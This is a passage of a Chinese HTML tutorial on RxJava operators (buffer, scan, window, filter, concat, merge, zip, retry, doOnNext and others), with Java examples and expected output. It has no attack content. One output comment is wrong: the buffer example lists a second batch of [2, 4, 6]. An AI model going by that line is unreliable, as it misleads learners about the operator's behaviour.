        Observable.just(<span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>)  <span class="hljs-comment">// 注意顺序：3, 1, 2</span>
                .flatMap(num -&gt;
                        Observable.just(num)
                                .delay(num, TimeUnit.SECONDS)  <span class="hljs-comment">// 延迟对应的秒数</span>
                )
                .subscribe(num -&gt; System.out.println(<span class="hljs-string">"flatMap: "</span> + num));
        <span class="hljs-comment">// 输出顺序：1 2 3（谁先完成谁先输出）</span>

        Observable.just(<span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>)
                .concatMap(num -&gt;
                        Observable.just(num)
                                .delay(num, TimeUnit.SECONDS)
                )
                .subscribe(num -&gt; System.out.println(<span class="hljs-string">"concatMap: "</span> + num));
        <span class="hljs-comment">// 输出顺序：3 1 2（严格保持原始顺序）</span>
        System.in.read();
    }
</code></pre>
<h4 data-id="heading-26">buffer</h4>
<p>buffer() 用于将 Observable 发射的数据项收集到集合中，然后一次性发射这些集合，而不是单个发射。
简单来说：把多个单独的数据"打包"成一批一起发射。</p>
<pre><code class="hljs language-java" lang="java">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        Observable.range(<span class="hljs-number">1</span>, <span class="hljs-number">10</span>)  <span class="hljs-comment">// 发射1-10</span>
                .buffer(<span class="hljs-number">3</span>)           <span class="hljs-comment">// 每3个一批</span>
                .subscribe(batch -&gt;
                        System.out.println(<span class="hljs-string">"批次: "</span> + batch)
                );

        <span class="hljs-comment">// 输出：</span>
        <span class="hljs-comment">// 批次: [1, 2, 3]</span>
        <span class="hljs-comment">// 批次: [2, 4, 6]</span>
        <span class="hljs-comment">// 批次: [7, 8, 9]</span>
        <span class="hljs-comment">// 批次: [10]           ← 最后一批不足3个</span>
    }
</code></pre>
<h4 data-id="heading-27">scan</h4>
<p>scan() 用于对 Observable 发射的数据进行累积计算，并发射每个中间结果。
简单来说：像 Excel 里的累计求和，每来一个新数据，就与前一个结果计算，并输出当前累计值。</p>
<pre><code class="hljs language-java" lang="java">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        Observable.just(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>)
                .scan(Integer::sum)
                .subscribe(result -&gt; System.out.print(result + <span class="hljs-string">" "</span>));

        <span class="hljs-comment">// 输出：</span>
        <span class="hljs-comment">// 1 3 6 10 15</span>

        <span class="hljs-comment">// 计算过程：</span>
        <span class="hljs-comment">// 初始：无种子值，第一次直接发射1</span>
        <span class="hljs-comment">// 1 + 2 = 3</span>
        <span class="hljs-comment">// 3 + 3 = 6</span>
        <span class="hljs-comment">// 6 + 4 = 10</span>
        <span class="hljs-comment">// 10 + 5 = 15</span>
    }
</code></pre>
<h4 data-id="heading-28">window</h4>
<p>window() 用于将 Observable 发射的数据分组到多个子 Observable 中，然后发射这些子 Observable 而不是单个数据项。
简单来说：创建多个"窗口"，每个窗口是一个 Observable，将数据分配到不同窗口中。</p>
<pre><code class="hljs language-java" lang="java">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-comment">// buffer: 直接发射List</span>
        Observable.range(<span class="hljs-number">1</span>, <span class="hljs-number">5</span>)
                .buffer(<span class="hljs-number">2</span>)
                .subscribe(list -&gt;
                        System.out.println(<span class="hljs-string">"buffer输出List: "</span> + list)
                );

        <span class="hljs-comment">// window: 发射Observable，需要进一步处理</span>
        Observable.range(<span class="hljs-number">1</span>, <span class="hljs-number">5</span>)
                .window(<span class="hljs-number">2</span>)
                .flatMapSingle(Observable::toList  <span class="hljs-comment">// 需要手动转换</span>
                )
                .subscribe(list -&gt;
                        System.out.println(<span class="hljs-string">"window输出List: "</span> + list)
                );

        <span class="hljs-comment">// 两者输出相同，但window更灵活：</span>
        <span class="hljs-comment">// 输出：</span>
        <span class="hljs-comment">// [1, 2]</span>
        <span class="hljs-comment">// [3, 4]</span>
        <span class="hljs-comment">// [5]</span>
    }
</code></pre>
<p>window 和 buffer 的区别就是：</p>
<ul>
<li>window 返回的是被观察者的集合。</li>
<li>buffer 返回的是数据的集合。</li>
</ul>
<h3 data-id="heading-29">过滤操作符</h3>
<p>过滤操作符用于从数据流中筛选出需要的数据，过滤掉不需要的数据。</p>
<h4 data-id="heading-30">filter</h4>
<p>filter() 是 RxJava 中最基本的过滤操作符，用于根据指定条件筛选 Observable 发射的数据，只让满足条件的数据通过，不满足条件的被过滤掉。</p>
<p>对每个数据项进行判断，返回 true则通过，返回 false则丢弃。</p>
<pre><code class="hljs language-java" lang="java">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        Observable.range(<span class="hljs-number">1</span>, <span class="hljs-number">10</span>)  <span class="hljs-comment">// 发射1-10</span>
                .filter(number -&gt; number % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>)  <span class="hljs-comment">// 只保留偶数</span>
                .subscribe(even -&gt; System.out.print(even + <span class="hljs-string">" "</span>));

        <span class="hljs-comment">// 输出：</span>
        <span class="hljs-comment">// 2 4 6 8 10</span>
    }
</code></pre>
<h4 data-id="heading-31">ofType</h4>
<p>ofType() 是一个类型过滤操作符，用于过滤 Observable 发射的数据，只保留指定类型的数据，其他类型的数据会被过滤掉。
核心思想：只让指定类型的数据通过，相当于 filter(item -&gt; item instanceof TargetType) 的简化版。</p>
<pre><code class="hljs language-java" lang="java">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        Observable&lt;Object&gt; mixedObservable = Observable.just(
                <span class="hljs-string">"Hello"</span>,      <span class="hljs-comment">// String</span>
                <span class="hljs-number">123</span>,          <span class="hljs-comment">// Integer</span>
                <span class="hljs-number">45.6</span>,         <span class="hljs-comment">// Double</span>
                <span class="hljs-string">"World"</span>,      <span class="hljs-comment">// String</span>
                <span class="hljs-literal">true</span>,         <span class="hljs-comment">// Boolean</span>
                <span class="hljs-number">789</span>           <span class="hljs-comment">// Integer</span>
        );

        <span class="hljs-comment">// 只保留字符串类型</span>
        mixedObservable
                .ofType(String.class)
                .subscribe(str -&gt;
                        System.out.println(<span class="hljs-string">"字符串: "</span> + str)
                );

        <span class="hljs-comment">// 输出：</span>
        <span class="hljs-comment">// 字符串: Hello</span>
        <span class="hljs-comment">// 字符串: World</span>
    }
</code></pre>
<h4 data-id="heading-32">distinct</h4>
<p>distinct() 用于过滤 Observable 中重复的数据项，确保每个数据项只发射一次。
核心思想：去重，保证发射的数据序列中不包含重复元素。</p>
<pre><code class="hljs language-java" lang="java">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        Observable.just(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">3</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">5</span>, <span class="hljs-number">1</span>)
                .distinct()
                .subscribe(num -&gt; System.out.print(num + <span class="hljs-string">" "</span>));

        <span class="hljs-comment">// 输出：</span>
        <span class="hljs-comment">// 1 2 3 4 5</span>
        <span class="hljs-comment">// 注意：最后的 1 也被去重了</span>
    }
</code></pre>
<h4 data-id="heading-33">skip &amp; skipLast</h4>
<ul>
<li>skip(n)：跳过 Observable 发射的前 n 个数据项。</li>
<li>skipLast(n)：跳过 Observable 发射的后 n 个数据项。</li>
</ul>
<p>核心思想：skip是"跳过开头"，skipLast是"跳过结尾"。</p>
<pre><code class="hljs language-java" lang="java">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        Observable.create(emitter -&gt; {
                    emitter.onNext(<span class="hljs-number">1</span>);
                    emitter.onNext(<span class="hljs-number">2</span>);
                    emitter.onError(<span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">"中间出错"</span>));
                })
                .skipLast(<span class="hljs-number">1</span>) 
                .subscribe(
                        num -&gt; System.out.println(<span class="hljs-string">"数据: "</span> + num),
                        error -&gt; System.err.println(<span class="hljs-string">"错误: "</span> + error.getMessage()),
                        () -&gt; System.out.println(<span class="hljs-string">"完成"</span>)
                );

        <span class="hljs-comment">// 输出：</span>
        <span class="hljs-comment">// 数据: 1</span>
        <span class="hljs-comment">// 错误: 中间出错</span>
    }
</code></pre>
<h4 data-id="heading-34">distinctUntilChanged</h4>
<p>distinctUntilChanged() 用于过滤掉连续重复的数据，只保留发生变化的数据。
核心思想：去重，但只去重连续相同的值，不连续出现的相同值会被保留。</p>
<pre><code class="hljs language-java" lang="java">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        Observable.just(<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">3</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>)
                .distinctUntilChanged()
                .subscribe(num -&gt; System.out.print(num + <span class="hljs-string">" "</span>));

        <span class="hljs-comment">// 输出：</span>
        <span class="hljs-comment">// 1 2 1 3 2 1</span>

        <span class="hljs-comment">// 解释：</span>
        <span class="hljs-comment">// 原始: 1, 1, 2, 2, 1, 3, 3, 2, 2, 1</span>
        <span class="hljs-comment">// 去重连续重复后: 1, 2, 1, 3, 2, 1</span>
        <span class="hljs-comment">// 注意：中间的 1 虽然出现过，但因为不连续，所以保留了</span>
    }
</code></pre>
<h4 data-id="heading-35">take</h4>
<p>take() 用于从 Observable 的开头取出指定数量的数据，然后完成。
核心思想：只取前 N 个数据，之后的数据忽略，Observable 提前完成。</p>
<pre><code class="hljs language-java" lang="java">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        Observable.range(<span class="hljs-number">1</span>, <span class="hljs-number">10</span>)  <span class="hljs-comment">// 发射1-10</span>
                .take(<span class="hljs-number">3</span>)             <span class="hljs-comment">// 只取前3个</span>
                .subscribe(
                        num -&gt; System.out.print(num + <span class="hljs-string">" "</span>),
                        error -&gt; {
                        },
                        () -&gt; System.out.println(<span class="hljs-string">"\n已完成"</span>)
                );

        <span class="hljs-comment">// 输出：</span>
        <span class="hljs-comment">// 1 2 3</span>
        <span class="hljs-comment">// 已完成</span>
        <span class="hljs-comment">// 注意：4-10 不会被发射</span>
    }
</code></pre>
<h4 data-id="heading-36">firstElement &amp; lastElement &amp; elementAt</h4>
<p>这三个操作符都用于从 Observable 中取出特定位置的单个元素：</p>
<ul>
<li><strong><code>firstElement()</code></strong>：取第一个元素</li>
<li><strong><code>lastElement()</code></strong>：取最后一个元素</li>
<li><strong><code>elementAt(index)</code></strong>：取指定索引位置的元素</li>
</ul>
<pre><code class="hljs language-java" lang="java">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        Observable.range(<span class="hljs-number">1</span>, <span class="hljs-number">5</span>)  <span class="hljs-comment">// 1,2,3,4,5</span>
                .firstElement()      <span class="hljs-comment">// 取第一个</span>
                .subscribe(
                        num -&gt; System.out.println(<span class="hljs-string">"第一个: "</span> + num),
                        error -&gt; {
                        },
                        () -&gt; System.out.println(<span class="hljs-string">"没有第一个元素"</span>)
                );

        <span class="hljs-comment">// 输出：</span>
        <span class="hljs-comment">// 第一个: 1</span>
    }
</code></pre>
<h3 data-id="heading-37">组合操作符</h3>
<p>组合操作符是 RxJava 中用于将多个 Observable 组合成一个 Observable 的操作符。它们处理多个数据流之间的关系，实现流的合并、连接、组合等操作。</p>
<h4 data-id="heading-38">concat</h4>
<p>concat() 用于顺序连接多个 Observable，前一个 Observable 完成后，才开始发射下一个 Observable 的数据。
核心思想：串行连接，保持顺序，像排队一样一个接一个。</p>
<pre><code class="hljs language-java" lang="java">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        Observable&lt;String&gt; first = Observable.just(<span class="hljs-string">"A"</span>, <span class="hljs-string">"B"</span>, <span class="hljs-string">"C"</span>);
        Observable&lt;String&gt; second = Observable.just(<span class="hljs-string">"D"</span>, <span class="hljs-string">"E"</span>, <span class="hljs-string">"F"</span>);
        Observable&lt;String&gt; third = Observable.just(<span class="hljs-string">"G"</span>, <span class="hljs-string">"H"</span>);

        Observable.concat(first, second, third)
                .subscribe(
                        letter -&gt; System.out.print(letter + <span class="hljs-string">" "</span>),
                        error -&gt; {
                        },
                        () -&gt; System.out.println(<span class="hljs-string">"\n全部完成"</span>)
                );

        <span class="hljs-comment">// 输出：</span>
        <span class="hljs-comment">// A B C D E F G H</span>
        <span class="hljs-comment">// 全部完成</span>
        <span class="hljs-comment">// 严格按照 first → second → third 的顺序</span>
    }
</code></pre>
<h4 data-id="heading-39">concatArray</h4>
<p>concatArray() 是 concat() 的数组版本，用于顺序连接多个 Observable（以数组形式提供），功能与 concat() 完全相同，只是参数形式不同。</p>
<pre><code class="hljs language-java" lang="java">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-comment">// 创建Observable数组</span>
        Observable&lt;String&gt;[] observables = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Observable</span>[]{
                Observable.just(<span class="hljs-string">"A"</span>, <span class="hljs-string">"B"</span>),
                Observable.just(<span class="hljs-string">"C"</span>, <span class="hljs-string">"D"</span>, <span class="hljs-string">"E"</span>),
                Observable.just(<span class="hljs-string">"F"</span>, <span class="hljs-string">"G"</span>)
        };

        <span class="hljs-comment">// 使用 concatArray 连接</span>
        Observable.concatArray(observables)
                .subscribe(letter -&gt; System.out.print(letter + <span class="hljs-string">" "</span>));

        <span class="hljs-comment">// 输出：</span>
        <span class="hljs-comment">// A B C D E F G</span>
        <span class="hljs-comment">// 顺序连接所有数组中的Observable</span>
    }
</code></pre>
<h4 data-id="heading-40">merge</h4>
<p>merge() 用于并发合并多个 Observable，将所有数据按实际到达时间顺序混合发射。</p>
<p>核心思想：并行执行，谁先到谁先出，像多车道合并成单车道。</p>
<pre><code class="hljs language-java" lang="java">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> InterruptedException {
        Observable&lt;Long&gt; fast = Observable.interval(<span class="hljs-number">100</span>, TimeUnit.MILLISECONDS)
                .map(i -&gt; i + <span class="hljs-number">100</span>)  <span class="hljs-comment">// 100, 101, 102...</span>
                .take(<span class="hljs-number">3</span>);
        Observable&lt;Long&gt; slow = Observable.interval(<span class="hljs-number">200</span>, TimeUnit.MILLISECONDS)
                .map(i -&gt; i + <span class="hljs-number">200</span>)  <span class="hljs-comment">// 200, 201, 202...</span>
                .take(<span class="hljs-number">3</span>);

        Observable.merge(fast, slow)
                .subscribe(num -&gt; System.out.print(num + <span class="hljs-string">" "</span>));

        Thread.sleep(<span class="hljs-number">1000</span>);

        <span class="hljs-comment">// 输出（实际时间顺序）：</span>
        <span class="hljs-comment">// 100 101 200 102 201 202</span>
        <span class="hljs-comment">// 解释：</span>
        <span class="hljs-comment">// 100ms: fast发射100</span>
        <span class="hljs-comment">// 200ms: slow发射200, fast发射101</span>
        <span class="hljs-comment">// 300ms: fast发射102</span>
        <span class="hljs-comment">// 400ms: slow发射201</span>
        <span class="hljs-comment">// 600ms: slow发射202</span>
    }
</code></pre>
<h4 data-id="heading-41">zip</h4>
<p>zip() 用于将多个 Observable 的数据按索引配对组合，像拉链一样一一对应。</p>
<p>核心思想：等待所有Observable都有数据，然后配对发射，以最短的Observable为准。</p>
<pre><code class="hljs language-java" lang="java">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        Observable&lt;String&gt; letters = Observable.just(<span class="hljs-string">"A"</span>, <span class="hljs-string">"B"</span>, <span class="hljs-string">"C"</span>, <span class="hljs-string">"D"</span>);
        Observable&lt;Integer&gt; numbers = Observable.just(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>);

        Observable.zip(
                        letters,
                        numbers,
                        (letter, number) -&gt; letter + number
                )
                .subscribe(result -&gt; System.out.print(result + <span class="hljs-string">" "</span>));

        <span class="hljs-comment">// 输出：</span>
        <span class="hljs-comment">// A1 B2 C3</span>
        <span class="hljs-comment">// 注意：D 被丢弃了，因为 numbers 只有3个</span>

    }
</code></pre>
<h4 data-id="heading-42">startWith &amp; startWithArray</h4>
<p>这两个操作符都用于在 Observable 发射数据之前，先发射一些指定的数据，就像给数据流添加"开场白"。</p>
<ul>
<li>startWith()：添加单个元素或 Observable。</li>
<li>startWithArray()：添加多个元素（可变参数）。</li>
</ul>
<pre><code class="hljs language-java" lang="java">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-comment">// startWith: 添加单个元素</span>
        Observable.just(<span class="hljs-string">"B"</span>, <span class="hljs-string">"C"</span>)
                .startWith(<span class="hljs-string">"A"</span>)
                .subscribe(letter -&gt; System.out.print(<span class="hljs-string">"startWith: "</span> + letter + <span class="hljs-string">" "</span>));

        <span class="hljs-comment">// startWithArray: 添加多个元素</span>
        Observable.just(<span class="hljs-string">"D"</span>, <span class="hljs-string">"E"</span>)
                .startWithArray(<span class="hljs-string">"A"</span>, <span class="hljs-string">"B"</span>, <span class="hljs-string">"C"</span>)
                .subscribe(letter -&gt; System.out.print(<span class="hljs-string">"startWithArray: "</span> + letter + <span class="hljs-string">" "</span>));

        <span class="hljs-comment">// 输出：</span>
        <span class="hljs-comment">// startWith: A B C</span>
        <span class="hljs-comment">// startWithArray: A B C D E</span>
    }
</code></pre>
<h4 data-id="heading-43">count</h4>
<p>count() 用于统计 Observable 发射的元素数量，返回一个发射单个计数值的 Observable。</p>
<p>核心思想：数一数发射了多少个元素。</p>
<pre><code class="hljs language-java" lang="java">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        Observable.just(<span class="hljs-string">"A"</span>, <span class="hljs-string">"B"</span>, <span class="hljs-string">"C"</span>, <span class="hljs-string">"D"</span>, <span class="hljs-string">"E"</span>)
                .count()
                .subscribe(count -&gt;
                        System.out.println(<span class="hljs-string">"元素数量: "</span> + count)
                );

        <span class="hljs-comment">// 输出：</span>
        <span class="hljs-comment">// 元素数量: 5</span>
    }
</code></pre>
<h3 data-id="heading-44">功能操作符</h3>
<p>功能操作符是 RxJava 中用于辅助调试、监控、错误处理、资源管理和工具性功能的操作符。它们不直接处理数据流，而是提供辅助功能。</p>
<h4 data-id="heading-45">delay</h4>
<p>delay() 用于延迟发射 Observable 的数据，可以延迟整个流，也可以延迟每个元素。
核心思想：让数据"等一会儿"再发射。</p>
<pre><code class="hljs language-java" lang="java">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> InterruptedException {
        System.out.println(<span class="hljs-string">"开始时间: "</span> + System.currentTimeMillis());

        Observable.just(<span class="hljs-string">"A"</span>, <span class="hljs-string">"B"</span>, <span class="hljs-string">"C"</span>)
                .delay(<span class="hljs-number">1</span>, TimeUnit.SECONDS)  <span class="hljs-comment">// 延迟1秒</span>
                .subscribe(item -&gt;
                        System.out.println(System.currentTimeMillis() + <span class="hljs-string">": "</span> + item)
                );

        Thread.sleep(<span class="hljs-number">2000</span>);

        <span class="hljs-comment">// 输出：</span>
        <span class="hljs-comment">// 开始时间: 1766569373459</span>
        <span class="hljs-comment">// 1766569374574: A</span>
        <span class="hljs-comment">// 1766569374580: B</span>
        <span class="hljs-comment">// 1766569374580: C</span>
        <span class="hljs-comment">// 注意：A,B,C几乎同时发射，都延迟了1秒</span>
    }
</code></pre>
<h4 data-id="heading-46">subscribeOn &amp; observerOn</h4>
<p>这两个操作符用于控制 Observable 在哪个线程上执行和观察，是 RxJava 线程调度的核心。</p>
<ul>
<li><strong><code>subscribeOn()</code></strong>：指定 Observable 执行在哪个线程</li>
<li><strong><code>observeOn()</code></strong>：指定 Observer 观察在哪个线程</li>
</ul>
<p>subscribeOn 示例：</p>
<pre><code class="hljs language-java" lang="java">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> InterruptedException {
        Observable.create(emitter -&gt; {
                    System.out.println(<span class="hljs-string">"执行线程: "</span> + Thread.currentThread().getName());
                    emitter.onNext(<span class="hljs-string">"数据"</span>);
                    emitter.onComplete();
                })
                .subscribeOn(Schedulers.io())  <span class="hljs-comment">// 在IO线程执行</span>
                .subscribe(data -&gt;
                        System.out.println(<span class="hljs-string">"接收线程: "</span> + Thread.currentThread().getName())
                );

        Thread.sleep(<span class="hljs-number">1000</span>);

        <span class="hljs-comment">// 输出：</span>
        <span class="hljs-comment">// 执行线程: RxCachedThreadScheduler-1</span>
        <span class="hljs-comment">// 接收线程: RxCachedThreadScheduler-1</span>
        <span class="hljs-comment">// 注意：执行和接收都在IO线程</span>
    }
</code></pre>
<p>observeOn 示例：</p>
<pre><code class="hljs language-java" lang="java">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> InterruptedException {
        Observable.create(emitter -&gt; {
                    System.out.println(<span class="hljs-string">"执行线程: "</span> + Thread.currentThread().getName());
                    emitter.onNext(<span class="hljs-string">"数据"</span>);
                    emitter.onComplete();
                })
                .observeOn(Schedulers.io())  <span class="hljs-comment">// 在IO线程接收</span>
                .subscribe(data -&gt;
                        System.out.println(<span class="hljs-string">"接收线程: "</span> + Thread.currentThread().getName())
                );

        Thread.sleep(<span class="hljs-number">1000</span>);

        <span class="hljs-comment">// 输出：</span>
        <span class="hljs-comment">// 执行线程: main</span>
        <span class="hljs-comment">// 接收线程: RxCachedThreadScheduler-1</span>
        <span class="hljs-comment">// 注意：执行在主线程，接收在IO线程</span>
    }
</code></pre>
<h4 data-id="heading-47">retry</h4>
<p>retry 用于在 Observable 发生错误时自动重试，实现错误恢复机制，直到成功或达到重试上限。</p>
<pre><code class="hljs language-java" lang="java">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-type">AtomicInteger</span> <span class="hljs-variable">attempt</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicInteger</span>();

        Observable.create(emitter -&gt; {
                    attempt.getAndIncrement();
                    System.out.println(<span class="hljs-string">"第"</span> + attempt + <span class="hljs-string">"次尝试"</span>);
                    <span class="hljs-keyword">if</span> (attempt.get() &lt; <span class="hljs-number">3</span>) {
                        emitter.onError(<span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">"随机失败"</span>));
                    } <span class="hljs-keyword">else</span> {
                        emitter.onNext(<span class="hljs-string">"成功"</span>);
                        emitter.onComplete();
                    }
                })
                .retry(<span class="hljs-number">2</span>)  <span class="hljs-comment">// 最多重试2次</span>
                .subscribe(
                        data -&gt; System.out.println(<span class="hljs-string">"结果: "</span> + data),
                        error -&gt; System.err.println(<span class="hljs-string">"最终失败: "</span> + error.getMessage())
                );

    <span class="hljs-comment">// 输出：</span>
    <span class="hljs-comment">// 第1次尝试</span>
    <span class="hljs-comment">// 第2次尝试</span>
    <span class="hljs-comment">// 第3次尝试</span>
    <span class="hljs-comment">// 结果: 成功</span>
    <span class="hljs-comment">// 尝试3次后成功（初始1次+重试2次）</span>
    }
</code></pre>
<h4 data-id="heading-48">retryUntil</h4>
<p>retryUntil 用于自定义重试停止条件，当条件满足时停止重试。</p>
<pre><code class="hljs language-java" lang="java">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-type">AtomicInteger</span> <span class="hljs-variable">attempt</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicInteger</span>(<span class="hljs-number">0</span>);
        Observable.create(emitter -&gt; {
                    <span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> attempt.incrementAndGet();
                    System.out.println(<span class="hljs-string">"第"</span> + count + <span class="hljs-string">"次尝试"</span>);
                    <span class="hljs-keyword">if</span> (count &lt; <span class="hljs-number">3</span>) {
                        emitter.onError(<span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">"失败"</span>));
                    } <span class="hljs-keyword">else</span> {
                        emitter.onNext(<span class="hljs-string">"成功"</span>);
                        emitter.onComplete();
                    }
                })
                .retryUntil(() -&gt; {
                    <span class="hljs-comment">// 返回 true 时停止重试</span>
                    <span class="hljs-keyword">return</span> attempt.get() &gt;= <span class="hljs-number">3</span>;  <span class="hljs-comment">// 尝试3次后停止</span>
                })
                .subscribe(
                        data -&gt; System.out.println(<span class="hljs-string">"结果: "</span> + data),
                        error -&gt; System.err.println(<span class="hljs-string">"最终失败: "</span> + error.getMessage())
                );

        <span class="hljs-comment">// 输出：</span>
        <span class="hljs-comment">// 第1次尝试</span>
        <span class="hljs-comment">// 第2次尝试</span>
        <span class="hljs-comment">// 第3次尝试</span>
        <span class="hljs-comment">// 结果: 成功</span>
    }
</code></pre>
<h3 data-id="heading-49">生命周期的功能操作符</h3>
<p>很多功能操作符贯穿整个发布订阅的生命周期中。</p>
<h4 data-id="heading-50">doOnSubscribe- 订阅时</h4>
<pre><code class="hljs language-java" lang="java">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        Observable.just(<span class="hljs-string">"A"</span>, <span class="hljs-string">"B"</span>, <span class="hljs-string">"C"</span>)
                .doOnSubscribe(disposable -&gt;
                        System.out.println(<span class="hljs-string">"有人订阅了！"</span>)
                )
                .subscribe();
        <span class="hljs-comment">// 输出：</span>
        <span class="hljs-comment">// 有人订阅了！</span>
    }
</code></pre>
<h4 data-id="heading-51">doOnNext - 发射每个元素时</h4>
<pre><code class="hljs language-java" lang="java">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        Observable.range(<span class="hljs-number">1</span>, <span class="hljs-number">3</span>)
                .doOnNext(num -&gt;
                        System.out.println(<span class="hljs-string">"即将发射: "</span> + num)
                )
                .map(num -&gt; num * <span class="hljs-number">2</span>)
                .doOnNext(num -&gt;
                        System.out.println(<span class="hljs-string">"发射后: "</span> + num)
                )
                .subscribe();

        <span class="hljs-comment">// 输出：</span>
        <span class="hljs-comment">// 即将发射: 1</span>
        <span class="hljs-comment">// 发射后: 2</span>
        <span class="hljs-comment">// 即将发射: 2</span>
        <span class="hljs-comment">// 发射后: 4</span>
        <span class="hljs-comment">// 即将发射: 3</span>
        <span class="hljs-comment">// 发射后: 6</span>
    }
</code></pre>
<h4 data-id="heading-52">doAfterNext - 发射后执行</h4>
<pre><code class="hljs language-java" lang="java">Observable.just(<span class="hljs-string">"A"</span>, <span class="hljs-string">"B"</span>, <span class="hljs-string">"C"</span>)
    .doOnNext(item -&gt; 
        System.out.println(<span class="hljs-string">"发射前: "</span> + item)
    )
    .doAfterNext(item -&gt; 
        System.out.println(<span class="hljs-string">"发射后: "</span> + item)
    )
    .subscribe(item -&gt; 
        System.out.println(<span class="hljs-string">"接收: "</span> + item)
    );

<span class="hljs-comment">// 输出：</span>
<span class="hljs-comment">// 发射前: A</span>
<span class="hljs-comment">// 接收: A</span>
<span class="hljs-comment">// 发射后: A</span>
<span class="hljs-comment">// 发射前: B</span>
<span class="hljs-comment">// 接收: B</span>
<span class="hljs-comment">// 发射后: B</span>
<span class="hljs-comment">// 发射前: C</span>
<span class="hljs-comment">// 接收: C</span>
<span class="hljs-comment">// 发射后: C</span>
</code></pre>
<h4 data-id="heading-53">doOnError - 出错时</h4>
